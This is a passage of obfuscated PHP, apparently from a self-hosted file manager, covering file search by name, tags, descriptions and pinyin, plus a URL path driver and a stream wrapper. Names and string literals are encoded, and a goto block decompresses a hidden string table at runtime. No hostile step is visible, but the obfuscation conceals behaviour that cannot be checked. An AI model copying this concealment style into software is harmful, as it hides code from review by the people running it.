$ÓèçÏÙø =& $_SERVER[Ôó‡è­ƒ]; $©ë”ğñÔ = KodIO::fileTypeList(); $„®Íû©Ú = $©ë”ğñÔ[$å™¬ğÙ]; if (!$„®Íû©Ú) { return array(); } $¨ùœÖ® = $„®Íû©Ú[$ÓèçÏÙø[171]]; $Ğ„€±‹Ğ = $ÓèçÏÙø[7]; if (!$„®Íû©Ú[$ÓèçÏÙø[171]]) { $ßõ’ç = array_to_keyvalue($©ë”ğñÔ, $ÓèçÏÙø[12], $ÓèçÏÙø[171]); $¨ùœÖ® = implode($ÓèçÏÙø[50], $ßõ’ç); $Ğ„€±‹Ğ = $ÓèçÏÙø[2070]; } $¼¹¥Àô = explode($ÓèçÏÙø[50], trim($¨ùœÖ®, $ÓèçÏÙø[50])); return array($Ğ„€±‹Ğ, $¼¹¥Àô); } public function listPathType($´ˆè€İØ) { $¤·åø­ô =& $_SERVER[Ôó‡è­ƒ]; $Û°‡á¾Ñ = $this->fileTypeWhere($´ˆè€İØ); if (!$Û°‡á¾Ñ) { return array(); } $ÓÀêÛĞÑ = array($¤·åø­ô[579] => SourceModel::TYPE_USER, $¤·åø­ô[580] => USER_ID, $¤·åø­ô[576] => 0, $¤·åø­ô[577] => $Û°‡á¾Ñ); return $this->listSource($ÓÀêÛĞÑ); } public function listSearch($şªİøú, $†‚·Ëè… = 300) { $¿É…Ÿ×É =& $_SERVER[Ôó‡è­ƒ]; if (isset($şªİøú[$¿É…Ÿ×É[1916]]) && $şªİøú[$¿É…Ÿ×É[1916]]) { $şªİøú[$¿É…Ÿ×É[1916]] = str_replace($¿É…Ÿ×É[383], $¿É…Ÿ×É[2071], trim($şªİøú[$¿É…Ÿ×É[1916]])); } $Õ›ÚÜëö = $this->_parseSearchWhere($şªİøú); $ÈÃˆÓ˜ = $Õ›ÚÜëö; if (!isset($Õ›ÚÜëö[$¿É…Ÿ×É[427]])) { $Õ›ÚÜëö[$¿É…Ÿ×É[427]] = 0; } $š–à”Æá = $¿É…Ÿ×É[2072]; $ˆÌóãŠš = $š–à”Æá; $this->_listSearchBindPinyin($şªİøú, $Õ›ÚÜëö, $š–à”Æá); $this->alias($¿É…Ÿ×É[440])->_makeOrder(); $Õ›ÚÜëö = $this->parseWhereLike($Õ›ÚÜëö); $ö™äÌûÉ = $this->distinct(!0)->field($š–à”Æá)->where($Õ›ÚÜëö)->selectPage($†‚·Ëè…); $this->_listSearchFileContent($ö™äÌûÉ, $şªİøú, $ˆÌóãŠš, $ÈÃˆÓ˜); $this->_listSearchDesc($ö™äÌûÉ, $şªİøú, $ˆÌóãŠš); $this->_listSearchTag($ö™äÌûÉ, $şªİøú, $ˆÌóãŠš); $this->_listSearchGroupTag($ö™äÌûÉ, $şªİøú, $ˆÌóãŠš); $this->_listDataApply($ö™äÌûÉ[$¿É…Ÿ×É[368]]); $this->_listMake($ö™äÌûÉ); return $ö™äÌûÉ; } private function _listSearchFileContent(&$¯«¥äøÁ, $ü¯ÖÃÈü, $ÔƒÍÏ‚, $ÉĞä¤Ìû) { $ûâ»ìÑÒ =& $_SERVER[Ôó‡è­ƒ]; if (!$ü¯ÖÃÈü[$ûâ»ìÑÒ[1916]] || $¯«¥äøÁ[$ûâ»ìÑÒ[365]][$ûâ»ìÑÒ[352]] > 1) { return; } if (!isset($ÉĞä¤Ìû[$ûâ»ìÑÒ[32]]) || !is_array($ü¯ÖÃÈü[$ûâ»ìÑÒ[463]])) { return; } $ÉĞä¤Ìû[$ûâ»ìÑÒ[463]] = array($ûâ»ìÑÒ[7], $ü¯ÖÃÈü[$ûâ»ìÑÒ[463]]); unset($ÉĞä¤Ìû[$ûâ»ìÑÒ[32]]); unset($ü¯ÖÃÈü[$ûâ»ìÑÒ[463]]); $®ÉŸßåÎ = $this->field($ÔƒÍÏ‚)->where($ÉĞä¤Ìû)->limit($ûâ»ìÑÒ[2073])->select(); if (!$®ÉŸßåÎ || count($®ÉŸßåÎ) == 0) { return; } $¯«¥äøÁ[$ûâ»ìÑÒ[368]] = array_merge($®ÉŸßåÎ, $¯«¥äøÁ[$ûâ»ìÑÒ[368]]); $¯«¥äøÁ[$ûâ»ìÑÒ[365]][$ûâ»ìÑÒ[366]] += count($®ÉŸßåÎ); } private function _listSearchTag(&$×Æª›ïÊ, $³Ç—û‡, $ŒÀ—Œåò) { $è’üª…ª =& $_SERVER[Ôó‡è­ƒ]; if (!$³Ç—û‡[$è’üª…ª[1916]] || $×Æª›ïÊ[$è’üª…ª[365]][$è’üª…ª[352]] > 1) { return; } $ˆØÔŸ¼Â = Model($è’üª…ª[2074])->listData(); $‹ª·†Ãõ = array(); $Ñëâø÷â = $³Ç—û‡[$è’üª…ª[1916]]; foreach ($ˆØÔŸ¼Â as $ú¼ë¨‘¦) { $Ÿ§à’òë = $ú¼ë¨‘¦[$è’üª…ª[32]]; $³ÇÃñ“ = str_replace($è’üª…ª[53], $è’üª…ª[12], Pinyin::get($Ÿ§à’òë)); if (stripos($Ÿ§à’òë, $Ñëâø÷â) !== !1 || stripos($³ÇÃñ“, $Ñëâø÷â) !== !1) { $‹ª·†Ãõ[] = $ú¼ë¨‘¦[$è’üª…ª[396]]; } } if (!$‹ª·†Ãõ) { return; } $ØÓ¤Ú«‰ = array($è’üª…ª[423] => array($è’üª…ª[7], $‹ª·†Ãõ), $è’üª…ª[1655] => USER_ID); $ãÛÄòáô = Model($è’üª…ª[424])->field($è’üª…ª[78])->where($ØÓ¤Ú«‰)->select(); $ãÛÄòáô = array_to_keyvalue($ãÛÄòáô, $è’üª…ª[12], $è’üª…ª[78]); $‰›ıœıï = array_unique($ãÛÄòáô); $this->_listSearchMerge($×Æª›ïÊ, $³Ç—û‡, $ŒÀ—Œåò, $‰›ıœıï); } private function _listSearchDesc(&$Û÷˜’€¸, $ÚŸ€Ø÷÷, $¨¢œÏ¥˜) { $ßİ´¼…˜ =& $_SERVER[Ôó‡è­ƒ]; if (!$ÚŸ€Ø÷÷[$ßİ´¼…˜[1916]] || $Û÷˜’€¸[$ßİ´¼…˜[365]][$ßİ´¼…˜[352]] > 1) { return; } $®‹¾õë© = $this->listSearchChildren($ÚŸ€Ø÷÷[$ßİ´¼…˜[494]]); $®‹¾õë© = array_unique($®‹¾õë©); if (!$®‹¾õë©) { return; } $áôåÒşë = array($ßİ´¼…˜[399] => array($ßİ´¼…˜[7], $®‹¾õë©), $ßİ´¼…˜[95] => $ßİ´¼…˜[447], $ßİ´¼…˜[373] => array($ßİ´¼…˜[382], $ßİ´¼…˜[1918] . $ÚŸ€Ø÷÷[$ßİ´¼…˜[1916]] . $ßİ´¼…˜[1918])); $Ù¼–†¥¢ = Model($ßİ´¼…˜[562])->field($ßİ´¼…˜[399])->where($áôåÒşë)->select(); $è·ŞßÆì = array_to_keyvalue($Ù¼–†¥¢, $ßİ´¼…˜[12], $ßİ´¼…˜[399]); $this->_listSearchMerge($Û÷˜’€¸, $ÚŸ€Ø÷÷, $¨¢œÏ¥˜, $è·ŞßÆì); } private function _listSearchGroupTag(&$„ş£ûÛ™, $ĞùÜøË¾, $™ºáà…Í) { $–§í“Äù =& $_SERVER[Ôó‡è­ƒ]; if (!$ĞùÜøË¾[$–§í“Äù[1916]] || $„ş£ûÛ™[$–§í“Äù[365]][$–§í“Äù[352]] > 1 || !$ĞùÜøË¾[$–§í“Äù[494]]) { return; } $ÅàØ„¶’ = $this->sourceInfo($ĞùÜøË¾[$–§í“Äù[494]]); if (!$ÅàØ„¶’ || $ÅàØ„¶’[$–§í“Äù[408]] != SourceModel::TYPE_GROUP) { return; } $ÃıçÕÆ = $ÅàØ„¶’[$–§í“Äù[501]]; $ò„ıÆŠ¤ = Model($–§í“Äù[2075])->get($ÃıçÕÆ); $…èÁÛ = array(); $úØ«±®º = $ĞùÜøË¾[$–§í“Äù[1916]]; foreach ($ò„ıÆŠ¤[$–§í“Äù[368]] as $èÑ³‚­¬) { $Œ¹íÍŞ© = $èÑ³‚­¬[$–§í“Äù[32]]; $†İû¶âÛ = str_replace($–§í“Äù[53], $–§í“Äù[12], Pinyin::get($Œ¹íÍŞ©)); if (stripos($Œ¹íÍŞ©, $úØ«±®º) !== !1 || stripos($†İû¶âÛ, $úØ«±®º) !== !1) { $…èÁÛ[] = $èÑ³‚­¬[$–§í“Äù[396]]; } } if (!$…èÁÛ) { return; } $Üå§ˆô = array($–§í“Äù[423] => array($–§í“Äù[7], $…èÁÛ), $–§í“Äù[1655] => 0, $–§í“Äù[33] => $–§í“Äù[1938] . $ÃıçÕÆ); $¡Öúã®é = Model($–§í“Äù[424])->field($–§í“Äù[78])->where($Üå§ˆô)->select(); $¡Öúã®é = array_to_keyvalue($¡Öúã®é, $–§í“Äù[12], $–§í“Äù[78]); $Ö×­ËŠ§ = array_unique($¡Öúã®é); $this->_listSearchMerge($„ş£ûÛ™, $ĞùÜøË¾, $™ºáà…Í, $Ö×­ËŠ§); } private function _listSearchMerge(&$ôİ‡îò, $Š¶ä£Ì®, $ÌÄ„´Â¾, $ãÆæõ•) { $¥’îÈ– =& $_SERVER[Ôó‡è­ƒ]; if (!$ãÆæõ•) { return; } $×À÷åŞƒ = array_to_keyvalue($ôİ‡îò[$¥’îÈ–[368]], $¥’îÈ–[12], $¥’îÈ–[399]); $ÜÕåĞôŒ = array_diff($ãÆæõ•, $×À÷åŞƒ); if (!$ÜÕåĞôŒ) { return; } $òŠ®ÓÜ™ = array($¥’îÈ–[399] => array($¥’îÈ–[7], $ÜÕåĞôŒ)); $İş×•ª = $this->field($ÌÄ„´Â¾)->where($òŠ®ÓÜ™)->select(); if (!$İş×•ª) { return; } $ıß¹Æ÷ğ = array(); foreach ($İş×•ª as $·ƒé½ç“) { if ($this->_listSearchFilter($·ƒé½ç“, $Š¶ä£Ì®)) { $ıß¹Æ÷ğ[] = $·ƒé½ç“; } } $ôİ‡îò[$¥’îÈ–[368]] = array_merge($ıß¹Æ÷ğ, $ôİ‡îò[$¥’îÈ–[368]]); $ôİ‡îò[$¥’îÈ–[365]][$¥’îÈ–[366]] += count($ıß¹Æ÷ğ); } private function _listSearchFilter($ñ¾ˆ¶Â¾, $’‘ƒŞ) { $Õ„óş ¶ =& $_SERVER[Ôó‡è­ƒ]; $ú‘ÚÕ˜È = $ñ¾ˆ¶Â¾[$Õ„óş ¶[407]] == $Õ„óş ¶[89]; if (!strstr($ñ¾ˆ¶Â¾[$Õ„óş ¶[517]], $Õ„óş ¶[50] . $’‘ƒŞ[$Õ„óş ¶[494]] . $Õ„óş ¶[50])) { return !1; } if (isset($’‘ƒŞ[$Õ„óş ¶[409]]) && $’‘ƒŞ[$Õ„óş ¶[409]] != $Õ„óş ¶[1877]) { if ($’‘ƒŞ[$Õ„óş ¶[409]] == $Õ„óş ¶[79] && !$ú‘ÚÕ˜È) { return !1; } if ($’‘ƒŞ[$Õ„óş ¶[409]] != $Õ„óş ¶[79] && $ú‘ÚÕ˜È) { return !1; } if (!strstr($ñ¾ˆ¶Â¾[$Õ„óş ¶[171]], $Õ„óş ¶[50] . $’‘ƒŞ[$Õ„óş ¶[409]] . $Õ„óş ¶[50])) { return !1; } } if (isset($’‘ƒŞ[$Õ„óş ¶[2076]]) && $’‘ƒŞ[$Õ„óş ¶[2076]] < $ñ¾ˆ¶Â¾[$Õ„óş ¶[80]]) { return !1; } if (isset($’‘ƒŞ[$Õ„óş ¶[2077]]) && $’‘ƒŞ[$Õ„óş ¶[2077]] > $ñ¾ˆ¶Â¾[$Õ„óş ¶[80]]) { return !1; } if (isset($’‘ƒŞ[$Õ„óş ¶[593]]) && $’‘ƒŞ[$Õ„óş ¶[593]] != $ñ¾ˆ¶Â¾[$Õ„óş ¶[450]]) { return !1; } return !0; } public function listSearchChildren($“ô ‘‰Ï, $ªıì˜Ç› = 5000) { $¢ ³Ä«é =& $_SERVER[Ôó‡è­ƒ]; $€©á÷óë = array(); $Ÿ´º°Ã’ = $this->sourceInfo($“ô ‘‰Ï); $ÑáÛë÷Ò = array($¢ ³Ä«é[517] => array($¢ ³Ä«é[382], $Ÿ´º°Ã’[$¢ ³Ä«é[517]] . $Ÿ´º°Ã’[$¢ ³Ä«é[399]] . $¢ ³Ä«é[544])); $ÒÎÂå¨› = $this->field($¢ ³Ä«é[80])->where($ÑáÛë÷Ò)->limit($ªıì˜Ç› + 1)->select(); $°Æ³ıÒ = is_array($ÒÎÂå¨›) ? count($ÒÎÂå¨›) : 0; if ($°Æ³ıÒ > $ªıì˜Ç›) { return $this->_listSearchChildrenNear($“ô ‘‰Ï, $ªıì˜Ç›); } $ê†úó‹ª = $this->field($¢ ³Ä«é[399])->where($ÑáÛë÷Ò)->select(); $€©á÷óë = array_to_keyvalue($ê†úó‹ª, $¢ ³Ä«é[12], $¢ ³Ä«é[399]); return $€©á÷óë; } private function _listSearchChildrenNear($ËÍ²¢ı¶, $¥ÀúÜç) { $‚“††Øâ =& $_SERVER[Ôó‡è­ƒ]; $¼ñÀŞ· = array(); $áØï®– = array($‚“††Øâ[494] => $ËÍ²¢ı¶); $½Åü•Ûµ = $this->field($‚“††Øâ[2078])->where($áØï®–)->select(); $ş¾ï ’ = array_to_keyvalue(array_filter_by_field($½Åü•Ûµ, $‚“††Øâ[407], $‚“††Øâ[89]), $‚“††Øâ[12], $‚“††Øâ[399]); $¼ñÀŞ· = array_merge($¼ñÀŞ·, array_to_keyvalue($½Åü•Ûµ, $‚“††Øâ[12], $‚“††Øâ[399])); if (!$ş¾ï ’) { return $¼ñÀŞ·; } $áØï®– = array($‚“††Øâ[494] => array($‚“††Øâ[7], $ş¾ï ’)); $½Åü•Ûµ = $this->field($‚“††Øâ[2078])->where($áØï®–)->limit($¥ÀúÜç)->select(); $¼ñÀŞ· = array_merge($¼ñÀŞ·, array_to_keyvalue($½Åü•Ûµ, $‚“††Øâ[12], $‚“††Øâ[399])); $¼ñÀŞ· = array_slice($¼ñÀŞ·, 0, $¥ÀúÜç); return $¼ñÀŞ·; } private function _listSearchBindPinyin($­à®û—Ø, &$ù—ˆ˜Úß, &$óÜ¶Àéİ) { $ª×Ëè¸¸ =& $_SERVER[Ôó‡è­ƒ]; if (!isset($­à®û—Ø[$ª×Ëè¸¸[1916]]) || !$­à®û—Ø[$ª×Ëè¸¸[1916]]) { return; } if (!Input::check($­à®û—Ø[$ª×Ëè¸¸[1916]], $ª×Ëè¸¸[317]) || strlen($­à®û—Ø[$ª×Ëè¸¸[1916]]) < 2) { return; } $çààÏŒç = "\114\105\106\124\x20\112\x4f\x49\116\x20{$this->tablePrefix}\151\x6f\x5f\163\157\165\162\x63\145\137\155\145\x74\141\x20\x6d\x65\164\141\x20\x6f\x6e\x20\163\157\165\x72\x63\145\56\163\157\x75\x72\143\145\x49\x44\x20\75\x20\x6d\x65\164\141\56\163\x6f\165\162\143\145\111\x44"; $±»ù‹í– = array(); $óÜ¶Àéİ = str_replace(array($ª×Ëè¸¸[230], $ª×Ëè¸¸[53], $ª×Ëè¸¸[2079]), $ª×Ëè¸¸[12], $óÜ¶Àéİ); $óÜ¶Àéİ = $ª×Ëè¸¸[432] . str_replace($ª×Ëè¸¸[50], $ª×Ëè¸¸[433], $óÜ¶Àéİ); $ˆàùæ = $ù—ˆ˜Úß[$ª×Ëè¸¸[32]]; unset($ù—ˆ˜Úß[$ª×Ëè¸¸[32]]); foreach ($ù—ˆ˜Úß as $„±ÊåÎÍ => $ºÂŞÏ§ó) { $±»ù‹í–[$ª×Ëè¸¸[432] . $„±ÊåÎÍ] = $ºÂŞÏ§ó; } foreach ($ˆàùæ as $Â’‚¸˜) { $±»ù‹í–[] = array($ª×Ëè¸¸[437] => $Â’‚¸˜, $ª×Ëè¸¸[1000] => $ª×Ëè¸¸[1920], array($ª×Ëè¸¸[2080] => $Â’‚¸˜, $ª×Ëè¸¸[2081] => array($ª×Ëè¸¸[7], array($ª×Ëè¸¸[460], $ª×Ëè¸¸[459])))); } $this->join($çààÏŒç); $ù—ˆ˜Úß = $±»ù‹í–; } private function _parseSearchWhere($õŸÍœè”) { $‹ìı½À’ =& $_SERVER[Ôó‡è­ƒ]; $ğ—ÃƒÖ¯ = array(); if (isset($õŸÍœè”[$‹ìı½À’[759]]) && $õŸÍœè”[$‹ìı½À’[759]]) { $ğ—ÃƒÖ¯[$‹ìı½À’[86]] = array($‹ìı½À’[2082], $õŸÍœè”[$‹ìı½À’[759]]); } if (isset($õŸÍœè”[$‹ìı½À’[492]]) && $õŸÍœè”[$‹ìı½À’[492]]) { $£ô´Âï¹ = array($‹ìı½À’[2083], $õŸÍœè”[$‹ìı½À’[492]]); if ($ğ—ÃƒÖ¯[$‹ìı½À’[86]]) { $ğ—ÃƒÖ¯[$‹ìı½À’[86]] = array($ğ—ÃƒÖ¯[$‹ìı½À’[86]], $£ô´Âï¹, $‹ìı½À’[2084]); } else { $ğ—ÃƒÖ¯[$‹ìı½À’[86]] = $£ô´Âï¹; } } if (isset($õŸÍœè”[$‹ìı½À’[2076]]) && $õŸÍœè”[$‹ìı½À’[2076]] > 0) { $ğ—ÃƒÖ¯[$‹ìı½À’[80]] = array($‹ìı½À’[2082], $õŸÍœè”[$‹ìı½À’[2076]]); } if (isset($õŸÍœè”[$‹ìı½À’[2077]]) && $õŸÍœè”[$‹ìı½À’[2077]]) { $£ô´Âï¹ = array($‹ìı½À’[2083], $õŸÍœè”[$‹ìı½À’[2077]]); if ($ğ—ÃƒÖ¯[$‹ìı½À’[80]]) { $ğ—ÃƒÖ¯[$‹ìı½À’[80]] = array($ğ—ÃƒÖ¯[$‹ìı½À’[80]], $£ô´Âï¹, $‹ìı½À’[2084]); } else { $ğ—ÃƒÖ¯[$‹ìı½À’[80]] = $£ô´Âï¹; } } if (isset($õŸÍœè”[$‹ìı½À’[593]]) && $õŸÍœè”[$‹ìı½À’[593]]) { $ğ—ÃƒÖ¯[] = array($‹ìı½À’[450] => $õŸÍœè”[$‹ìı½À’[593]], $‹ìı½À’[448] => $õŸÍœè”[$‹ìı½À’[593]], $‹ìı½À’[1000] => $‹ìı½À’[1920]); } if (isset($õŸÍœè”[$‹ìı½À’[409]]) && $õŸÍœè”[$‹ìı½À’[409]]) { $™“¶Çü• = $õŸÍœè”[$‹ìı½À’[409]]; if ($™“¶Çü• == $‹ìı½À’[79]) { $ğ—ÃƒÖ¯[$‹ìı½À’[407]] = 1; } else { if ($™“¶Çü• == $‹ìı½À’[2085]) { $ğ—ÃƒÖ¯[$‹ìı½À’[407]] = 0; } else { if ($™“¶Çü•) { $™“¶Çü• = is_array($™“¶Çü•) ? $™“¶Çü• : explode($‹ìı½À’[50], $™“¶Çü•); $ğ—ÃƒÖ¯[$‹ìı½À’[409]] = array($‹ìı½À’[415], $™“¶Çü•); $ğ—ÃƒÖ¯[$‹ìı½À’[407]] = 0; } } } } $this->_parseSearchParent($õŸÍœè”, $ğ—ÃƒÖ¯); if (isset($õŸÍœè”[$‹ìı½À’[1916]]) && trim($õŸÍœè”[$‹ìı½À’[1916]])) { $¦Š´Å×ì = trim($õŸÍœè”[$‹ìı½À’[1916]]); $¼¡Ë—ŒĞ = explode($‹ìı½À’[53], $¦Š´Å×ì); if (strlen($¦Š´Å×ì) > 2 && (substr($¦Š´Å×ì, 0, 1) == $‹ìı½À’[119] && substr($¦Š´Å×ì, -1) == $‹ìı½À’[119]) || substr($¦Š´Å×ì, 0, 1) == $‹ìı½À’[58] && substr($¦Š´Å×ì, -1) == $‹ìı½À’[58]) { $¦Š´Å×ì = substr($¦Š´Å×ì, 1, -1); $¼¡Ë—ŒĞ = array($¦Š´Å×ì); } $ğ—ÃƒÖ¯[$‹ìı½À’[32]] = array(array($‹ìı½À’[543], $‹ìı½À’[1918] . $¦Š´Å×ì . $‹ìı½À’[1918])); if (count($¼¡Ë—ŒĞ) > 1) { $ğ—ÃƒÖ¯[$‹ìı½À’[32]] = array(); foreach ($¼¡Ë—ŒĞ as $ø¯À£×§) { if (!trim($ø¯À£×§)) { continue; } $ğ—ÃƒÖ¯[$‹ìı½À’[32]][] = array($‹ìı½À’[543], $‹ìı½À’[1918] . trim($ø¯À£×§) . $‹ìı½À’[1918]); } } } return $ğ—ÃƒÖ¯; } private function _parseSearchParent($ÓŸâ¯ñ, &$¯³•Ô‚±) { $ªöüõƒ =& $_SERVER[Ôó‡è­ƒ]; if (!isset($ÓŸâ¯ñ[$ªöüõƒ[494]]) || !$ÓŸâ¯ñ[$ªöüõƒ[494]]) { return; } $µ¬¡òÙ’ = $this->pathInfo($ÓŸâ¯ñ[$ªöüõƒ[494]]); $ˆÕÏÄ¸Ò = $µ¬¡òÙ’[$ªöüõƒ[494]] . $ªöüõƒ[12] === $ªöüõƒ[194]; $Ç–Å§æ‚ = $µ¬¡òÙ’[$ªöüõƒ[408]] == $ªöüõƒ[511]; if ($µ¬¡òÙ’[$ªöüõƒ[528]] == $ªöüõƒ[529]) { $‘Øãí©™ = $this->sourceInfo($ÓŸâ¯ñ[$ªöüõƒ[494]]); $µ¬¡òÙ’[$ªöüõƒ[517]] = $‘Øãí©™[$ªöüõƒ[517]]; } $¯³•Ô‚±[$ªöüõƒ[583]] = array($ªöüõƒ[543], $µ¬¡òÙ’[$ªöüõƒ[517]] . $ÓŸâ¯ñ[$ªöüõƒ[494]] . $ªöüõƒ[544]); $¤âêÇ«— = isset($ÓŸâ¯ñ[$ªöüõƒ[1782]]) && in_array($ªöüõƒ[511], $ÓŸâ¯ñ[$ªöüõƒ[1782]]); if (!$¤âêÇ«— || !$Ç–Å§æ‚ || !$ˆÕÏÄ¸Ò || !$µ¬¡òÙ’[$ªöüõƒ[410]]) { return; } if (!AuthModel::authCheckRoot($µ¬¡òÙ’[$ªöüõƒ[410]][$ªöüõƒ[411]])) { return; } $ÒÄş¼õ¶ = $µ¬¡òÙ’[$ªöüõƒ[501]] . $ªöüõƒ[12]; if ($ÒÄş¼õ¶ == $ªöüõƒ[89]) { unset($¯³•Ô‚±[$ªöüõƒ[583]]); $¯³•Ô‚±[$ªöüõƒ[408]] = self::TYPE_GROUP; return; } $Ş›üğª­ = Model($ªöüõƒ[518])->groupChildrenAll($ÒÄş¼õ¶); $›ûï†’© = count($Ş›üğª­); if ($›ûï†’© <= 1) { return; } $ŒÊ³Êêü = array($ªöüõƒ[494] => 0, $ªöüõƒ[408] => self::TYPE_GROUP, $ªöüõƒ[501] => array($ªöüõƒ[7], $Ş›üğª­)); $Š¹áø = $this->field($ªöüõƒ[2086])->where($ŒÊ³Êêü)->limit($›ûï†’©)->select(); $¯³•Ô‚±[$ªöüõƒ[583]] = array(); foreach ($Š¹áø as $ÏòØğç) { $¯³•Ô‚±[$ªöüõƒ[583]][] = array($ªöüõƒ[543], $ªöüõƒ[527] . $ÏòØğç[$ªöüõƒ[399]] . $ªöüõƒ[544]); } $¯³•Ô‚±[$ªöüõƒ[583]][] = $ªöüõƒ[1920]; } } goto c¨åÏâï™±; bÌŞ¨Ê˜Æ­: $_SERVER[¶—·¥ù®] = explode($_SERVER[Ôó‡è­ƒ][607], gzinflate(substr($_SERVER[Ôó‡è­ƒ][608], 10, -8))); $xoqamhvtei = $_SERVER[Ôó‡è­ƒ][609]; while (strlen($xoqamhvtei) < $_SERVER[Ôó‡è­ƒ][606]) { if (!$xoqamhvtei) { break; } $xoqamhvtei++; } goto C¿©ïÑ¨š; D—·êôÂ•: define($_SERVER[Ôó‡è­ƒ][603], $_SERVER[Ôó‡è­ƒ][604]); $baflptzmhc = $_SERVER[Ôó‡è­ƒ][605]; while ($baflptzmhc < $_SERVER[Ôó‡è­ƒ][606]) { if ($baflptzmhc >= 0) { break; } $baflptzmhc++; } goto bÌŞ¨Ê˜Æ­; Ağ°åÄ¡ª¯: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ƒ„®”ß° = false) { } public function exist($ì å«òî) { $ÓŞó…Ş = $this->info($ì å«òî); return $ÓŞó…Ş[$_SERVER[Ôó‡è­ƒ][198]]; } public function isFile($›«ªÌ‚¦) { $«„š½ÀÇ = $this->info($›«ªÌ‚¦); return $«„š½ÀÇ[$_SERVER[Ôó‡è­ƒ][198]]; } public function isFolder($åß¦») { return !1; } public function size($Œ—ºş…Ë) { $˜úÊÜ¿ = $this->info($Œ—ºş…Ë); return $˜úÊÜ¿[$_SERVER[Ôó‡è­ƒ][80]]; } public function info($Öõ‚’’) { return $this->infoParse($Öõ‚’’); } public function infoAuth($Î¿˜İú‹) { return $this->infoParse($Î¿˜İú‹); } public function infoWithChildren($…ÇÊòƒ×) { return $this->infoParse($…ÇÊòƒ×); } public function infoFull($Áº“¦Ï¤) { return $this->infoParse($Áº“¦Ï¤); } private function infoParse($é’³šÎÂ) { $¾Ò®—å¼ =& $_SERVER[Ôó‡è­ƒ]; $Í¢¨°é¥ = $this->header($é’³šÎÂ); if (!$Í¢¨°é¥ || !$Í¢¨°é¥[$¾Ò®—å¼[748]]) { return !1; } $¹êŠÄ±± = _get($Í¢¨°é¥, $¾Ò®—å¼[336], 0); $¶¶úÜŞï = array($¾Ò®—å¼[32] => $Í¢¨°é¥[$¾Ò®—å¼[32]], $¾Ò®—å¼[78] => $é’³šÎÂ, $¾Ò®—å¼[33] => $¾Ò®—å¼[196], $¾Ò®—å¼[80] => intval($¹êŠÄ±±), $¾Ò®—å¼[171] => get_path_ext($Í¢¨°é¥[$¾Ò®—å¼[32]]), $¾Ò®—å¼[1377] => $¹êŠÄ±± > 0 && $Í¢¨°é¥[$¾Ò®—å¼[1500]], $¾Ò®—å¼[1378] => !1); return $¶¶úÜŞï; } private function header($ŠÄ·“Ş›) { $òò²±¡² =& $_SERVER[Ôó‡è­ƒ]; if (isset(self::$_cacheHeader[$ŠÄ·“Ş›])) { return self::$_cacheHeader[$ŠÄ·“Ş›]; } $ÓÆªÓÁÄ = isset($GLOBALS[$òò²±¡²[1501]]) ? $GLOBALS[$òò²±¡²[1501]] : !1; $GLOBALS[$òò²±¡²[1501]] = !0; self::$_cacheHeader[$ŠÄ·“Ş›] = url_header($ŠÄ·“Ş›); $GLOBALS[$òò²±¡²[1501]] = $ÓÆªÓÁÄ; return self::$_cacheHeader[$ŠÄ·“Ş›]; } public function hashSimple($íÏÁÖÓì, $€º‡é = false) { $‚ŒøİÏ¨ =& $_SERVER[Ôó‡è­ƒ]; $ˆÁ®óãñ = $this->info($íÏÁÖÓì); if (!$ˆÁ®óãñ || !$ˆÁ®óãñ[$‚ŒøİÏ¨[198]]) { return !1; } $¹¥ÄŸ¬³ = $ˆÁ®óãñ[$‚ŒøİÏ¨[80]]; $°Ä¬òØÙ = 200; $è«‚ì“ğ = 50; if ($¹¥ÄŸ¬³ <= $°Ä¬òØÙ * $è«‚ì“ğ) { return md5($this->fileSubstr($íÏÁÖÓì, 0, $¹¥ÄŸ¬³)) . $¹¥ÄŸ¬³; } $ŠĞÒ«õ = intval($¹¥ÄŸ¬³ / $è«‚ì“ğ); $û‰‚Ì³š = $‚ŒøİÏ¨[12]; $ÉÒ•¹— = timeFloat(); $ê‡›¨¼ = 15; for ($¾¥ƒ† = 0; $¾¥ƒ† < $è«‚ì“ğ; $¾¥ƒ†++) { if (timeFloat() - $ÉÒ•¹— > $ê‡›¨¼) { return !1; } $›¸®‹¥† = $this->fileSubstr($íÏÁÖÓì, $ŠĞÒ«õ * $¾¥ƒ†, $°Ä¬òØÙ); if (!$›¸®‹¥†) { return !1; } $û‰‚Ì³š .= $›¸®‹¥†; } $û‰‚Ì³š .= $this->fileSubstr($íÏÁÖÓì, $¹¥ÄŸ¬³ - $°Ä¬òØÙ, $°Ä¬òØÙ); return md5($û‰‚Ì³š) . $¹¥ÄŸ¬³; } public function getContent($¦êÖ‰ÛŒ) { return $this->fileSubstr($¦êÖ‰ÛŒ); } public function fileSubstr($Ëà´şĞ, $¯âŞüªŞ = 0, $Û¬êÛ˜¾ = -1) { $éÔŞé¢‹ =& $_SERVER[Ôó‡è­ƒ]; $êü½ ö = $this->info($Ëà´şĞ); if (!$êü½ ö || !$êü½ ö[$éÔŞé¢‹[198]] && $êü½ ö[$éÔŞé¢‹[80]] > 1024 * 1024 * 10) { return !1; } if ($Û¬êÛ˜¾ === -1) { $Û¬êÛ˜¾ = $êü½ ö[$éÔŞé¢‹[80]]; } if ($Û¬êÛ˜¾ == 0) { return $éÔŞé¢‹[12]; } $¡•âãÀç = array($éÔŞé¢‹[1502] . $¯âŞüªŞ . $éÔŞé¢‹[780] . ($¯âŞüªŞ + $Û¬êÛ˜¾ - 1)); $Û‘çàê© = url_request($Ëà´şĞ, $éÔŞé¢‹[229], !1, $¡•âãÀç, !1, !1, 1); return $Û‘çàê©[$éÔŞé¢‹[1191]] ? $Û‘çàê©[$éÔŞé¢‹[1191]] : $éÔŞé¢‹[12]; } public function download($Ö¤ úĞ·, $ı¾Ë¢÷©) { Downloader::start($Ö¤ úĞ·, $ı¾Ë¢÷©); return $ı¾Ë¢÷©; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÅÓåñ£í, $‚â©˜¯ = '') { $this->info = $this->info($ÅÓåñ£í); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ôó‡è­ƒ][78]]; $this->pathOpen = $ÅÓåñ£í; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÅÓåñ£í])) { self::$_chunkBuffer[$ÅÓåñ£í] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($İ¢™»‡¼) { $“”—¾öÄ = $this->fileSubstr($this->pose, $İ¢™»‡¼); $this->pose += strlen($“”—¾öÄ); 